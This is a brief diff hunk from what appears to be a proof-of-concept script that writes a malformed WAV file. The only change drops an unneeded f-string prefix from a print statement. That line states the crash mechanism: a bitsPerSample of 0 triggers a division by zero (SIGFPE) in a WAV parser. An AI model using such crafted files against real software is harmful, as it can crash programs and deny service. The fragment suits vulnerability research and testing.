@@ -39,7 +39,7 @@ def main():
         f.write(wav)
     sz = os.path.getsize(output)
     print(f"[+] PoC: {output} ({sz} bytes)")
-    print(f"[+] bitsPerSample=0 → dataSize/(0/8) → SIGFPE → crash")
+    print("[+] bitsPerSample=0 → dataSize/(0/8) → SIGFPE → crash")
     
     # Verify: bitsPerSample is at offset 34
     bps = struct.unpack('<H', wav[34:36])[0]
